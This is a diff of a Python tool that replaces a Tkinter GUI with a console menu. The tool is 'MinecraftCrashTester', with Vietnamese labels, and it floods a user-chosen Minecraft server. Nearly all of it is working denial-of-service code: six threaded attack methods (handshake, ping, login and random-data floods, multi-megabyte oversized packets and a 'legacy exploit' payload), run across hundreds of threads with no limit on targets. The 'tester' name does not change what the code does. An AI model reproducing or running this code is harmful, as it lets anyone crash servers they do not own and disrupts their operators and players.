@@ -1,84 +1,196 @@
-import tkinter as tk
-from tkinter import ttk
+import socket
 import threading
+import random
 import time
-from tester import MinecraftCrashTester  # Đảm bảo file tester.py chứa class gốc bạn đã đưa
+import struct
 
-class MinecraftTesterGUI:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("Minecraft Server Crash Tester GUI")
+class MinecraftCrashTester:
+    METHODS = {
+        'handshake_flood': "Gửi handshake không hợp lệ",
+        'ping_flood': "Gửi ping liên tục",
+        'invalid_data': "Gửi dữ liệu ngẫu nhiên",
+        'oversized_packet': "Gửi gói tin lớn",
+        'login_flood': "Flood login",
+        'legacy_exploit': "Tấn công phiên bản cũ"
+    }
 
-        self.tester = None
-        self.thread = None
+    def __init__(self, host, port=25565, threads=500, timeout=3, method='all'):
+        self.host = host
+        self.port = port
+        self.threads = threads
+        self.timeout = timeout
+        self.method = method
+        self.counter = 0
+        self.running = False
+        self.attack_methods = {
+            'handshake_flood': self.handshake_flood,
+            'ping_flood': self.ping_flood,
+            'invalid_data': self.invalid_data,
+            'oversized_packet': self.oversized_packet,
+            'login_flood': self.login_flood,
+            'legacy_exploit': self.legacy_exploit
+        }
 
-        # Host
-        tk.Label(root, text="Server IP:").grid(row=0, column=0, sticky="e")
-        self.host_entry = tk.Entry(root)
-        self.host_entry.grid(row=0, column=1)
+    def get_random_bytes(self, size):
+        return bytes([random.randint(0, 255) for _ in range(size)])
 
-        # Port
-        tk.Label(root, text="Port:").grid(row=1, column=0, sticky="e")
-        self.port_entry = tk.Entry(root)
-        self.port_entry.insert(0, "25565")
-        self.port_entry.grid(row=1, column=1)
+    def create_socket(self):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(self.timeout)
+            s.connect((self.host, self.port))
+            return s
+        except:
+            return None
 
-        # Threads
-        tk.Label(root, text="Threads:").grid(row=2, column=0, sticky="e")
-        self.threads_entry = tk.Entry(root)
-        self.threads_entry.insert(0, "200")
-        self.threads_entry.grid(row=2, column=1)
+    def handshake_flood(self):
+        while self.running:
+            try:
+                s = self.create_socket()
+                if s:
+                    version = random.randint(0, 999)
+                    host_len = len(self.host)
+                    port = struct.pack('>H', self.port)
+                    data = b'\x00'
+                    data += struct.pack('>B', version)
+                    data += struct.pack('>B', host_len) + self.host.encode()
+                    data += port
+                    data += b'\x01'
+                    s.send(data)
+                    time.sleep(0.1)
+                    s.close()
+                    self.counter += 1
+            except:
+                pass
 
-        # Method
-        tk.Label(root, text="Method:").grid(row=3, column=0, sticky="e")
-        self.method_var = tk.StringVar()
-        self.method_dropdown = ttk.Combobox(root, textvariable=self.method_var)
-        self.method_dropdown['values'] = ['all', 'handshake_flood', 'ping_flood', 'invalid_data', 'oversized_packet', 'login_flood', 'legacy_exploit']
-        self.method_dropdown.current(0)
-        self.method_dropdown.grid(row=3, column=1)
+    def ping_flood(self):
+        while self.running:
+            try:
+                s = self.create_socket()
+                if s:
+                    s.send(b'\x01\x00')
+                    time.sleep(0.05)
+                    s.close()
+                    self.counter += 1
+            except:
+                pass
 
-        # Buttons
-        self.start_button = tk.Button(root, text="Bắt đầu", command=self.start_attack)
-        self.start_button.grid(row=4, column=0, pady=10)
+    def invalid_data(self):
+        while self.running:
+            try:
+                s = self.create_socket()
+                if s:
+                    s.send(self.get_random_bytes(random.randint(10, 1000)))
+                    time.sleep(0.1)
+                    s.close()
+                    self.counter += 1
+            except:
+                pass
 
-        self.stop_button = tk.Button(root, text="Dừng", command=self.stop_attack, state='disabled')
-        self.stop_button.grid(row=4, column=1)
+    def oversized_packet(self):
+        while self.running:
+            try:
+                s = self.create_socket()
+                if s:
+                    size = random.randint(1000000, 3000000)
+                    s.send(struct.pack('>I', size) + self.get_random_bytes(size))
+                    time.sleep(0.2)
+                    s.close()
+                    self.counter += 1
+            except:
+                pass
 
-        # Log
-        self.log_label = tk.Label(root, text="Chưa chạy...", fg="gray")
-        self.log_label.grid(row=5, column=0, columnspan=2)
+    def login_flood(self):
+        while self.running:
+            try:
+                s = self.create_socket()
+                if s:
+                    host_len = len(self.host)
+                    data = b'\x00'
+                    data += struct.pack('>B', 47)
+                    data += struct.pack('>B', host_len) + self.host.encode()
+                    data += struct.pack('>H', self.port)
+                    data += b'\x02'
+                    s.send(data)
+                    username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
+                    login_data = b'\x00' + struct.pack('>B', len(username)) + username.encode()
+                    s.send(login_data)
+                    time.sleep(0.2)
+                    s.close()
+                    self.counter += 1
+            except:
+                pass
 
-        self.update_counter_loop()
+    def legacy_exploit(self):
+        while self.running:
+            try:
+                s = self.create_socket()
+                if s:
+                    payload = b'\x0F' + b'\x00'*16 + b'\xFF'*1000
+                    s.send(payload)
+                    time.sleep(0.1)
+                    s.close()
+                    self.counter += 1
+            except:
+                pass
 
-    def start_attack(self):
-        host = self.host_entry.get()
-        port = int(self.port_entry.get())
-        threads = int(self.threads_entry.get())
-        method = self.method_var.get()
+    def start(self):
+        self.running = True
+        threads = []
 
-        self.tester = MinecraftCrashTester(host, port=port, threads=threads, method=method)
-        self.tester.running = True
+        if self.method == 'all':
+            methods = list(self.attack_methods.values())
+        else:
+            methods = [self.attack_methods[self.method]]
 
-        self.thread = threading.Thread(target=self.tester.start)
-        self.thread.start()
+        for _ in range(self.threads):
+            for method in methods:
+                t = threading.Thread(target=method)
+                t.daemon = True
+                threads.append(t)
+                t.start()
 
-        self.start_button.config(state='disabled')
-        self.stop_button.config(state='normal')
-        self.log_label.config(text="Đang chạy...", fg="green")
+        try:
+            while self.running:
+                print(f"\r[+] Đang gửi gói tin... Tổng: {self.counter}", end='')
+                time.sleep(0.5)
+        except KeyboardInterrupt:
+            self.stop()
 
-    def stop_attack(self):
-        if self.tester:
-            self.tester.stop()
-        self.start_button.config(state='normal')
-        self.stop_button.config(state='disabled')
-        self.log_label.config(text="Đã dừng", fg="red")
+    def stop(self):
+        self.running = False
+        print("\n[+] Đã dừng.")
 
-    def update_counter_loop(self):
-        if self.tester and self.tester.running:
-            self.log_label.config(text=f"Đang gửi: {self.tester.counter} gói tin")
-        self.root.after(1000, self.update_counter_loop)
+def main():
+    print("Minecraft Crash Tester - Console GUI")
+    print("====================================")
 
-if __name__ == "__main__":
-    root = tk.Tk()
-    app = MinecraftTesterGUI(root)
-    root.mainloop()
+    host = input("Nhập IP Server: ")
+    port = input("Nhập Port (mặc định 25565): ") or "25565"
+    threads = input("Số luồng (VD: 200): ") or "200"
+
+    print("\nChọn phương pháp tấn công:")
+    methods = list(MinecraftCrashTester.METHODS.keys())
+    for i, key in enumerate(methods):
+        print(f"  [{i+1}] {key} - {MinecraftCrashTester.METHODS[key]}")
+    print("  [0] Tất cả phương pháp")
+
+    try:
+        method_choice = int(input("Chọn số: "))
+        method = 'all' if method_choice == 0 else methods[method_choice - 1]
+    except:
+        print("Chọn sai, mặc định dùng all")
+        method = 'all'
+
+    tester = MinecraftCrashTester(
+        host,
+        port=int(port),
+        threads=int(threads),
+        method=method
+    )
+
+    print("\nNhấn Ctrl+C để dừng...\n")
+    tester.start()
+
+if __name__ == '__main__':
+    main()
